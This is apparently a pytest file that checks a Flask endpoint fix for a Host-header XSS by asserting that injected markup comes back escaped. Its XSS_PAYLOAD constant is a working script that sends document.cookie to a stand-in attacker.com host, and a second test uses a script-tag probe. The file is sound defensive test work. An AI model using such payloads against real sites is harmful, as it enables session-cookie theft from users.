"""
Proof tests for the Host Header Injection XSS fix in hhi.py.

Attack vector: POST /api/hhivuln with a crafted Host header containing
HTML/JS that breaks out of the <a href='...'> attribute context.

On the vulnerable code  → h is interpolated raw into the HTML response.
On the fixed code       → html.escape(h) neutralises <, >, ', ", & before
                          they reach the browser's HTML parser.
"""

import flask
import pytest

from hhi import hhivuln

XSS_PAYLOAD = "evil.com'><script>document.location='https://attacker.com?c='+document.cookie</script><a href='"
BENIGN_HOST = "example.com"


@pytest.fixture
def app():
    return flask.Flask(__name__)


def test_xss_payload_is_escaped(app):
    """
    The XSS payload must be HTML-escaped in the response — it must NOT
    contain raw < or > characters that a browser would parse as tags.

    This test FAILS on the vulnerable code (raw Host echoed into href)
    and PASSES on the fixed code (html.escape applied).
    """
    with app.test_request_context(
        "/api/hhivuln",
        method="POST",
        headers={"Host": XSS_PAYLOAD},
    ):
        result, status = hhivuln(None)
        msg = result["msg"]

        assert status == 200
        # html.escape must convert < > ' " & into entity references
        assert "<script>" not in msg, f"Raw <script> tag in response! Got: {msg!r}"
        assert "</script>" not in msg, f"Raw </script> tag in response! Got: {msg!r}"
        # The injected single-quote that breaks out of the href must be escaped
        assert "&#x27;" in msg or "&apos;" in msg or "&#39;" in msg, (
            f"Single-quote not escaped in href attribute! Got: {msg!r}"
        )


def test_benign_host_passes_through(app):
    """A normal Host header value is returned unmodified (no double-escaping)."""
    with app.test_request_context(
        "/api/hhivuln",
        method="POST",
        headers={"Host": BENIGN_HOST},
    ):
        result, status = hhivuln(None)
        assert status == 200
        assert BENIGN_HOST in result["msg"]


def test_script_tag_in_host_not_reflected_raw(app):
    """A Host containing a bare <script> tag must not appear unescaped."""
    with app.test_request_context(
        "/api/hhivuln",
        method="POST",
        headers={"Host": "<script>alert(1)</script>"},
    ):
        result, status = hhivuln(None)
        assert status == 200
        assert "<script>" not in result["msg"], (
            f"Unescaped <script> reflected! Got: {result['msg']!r}"
        )
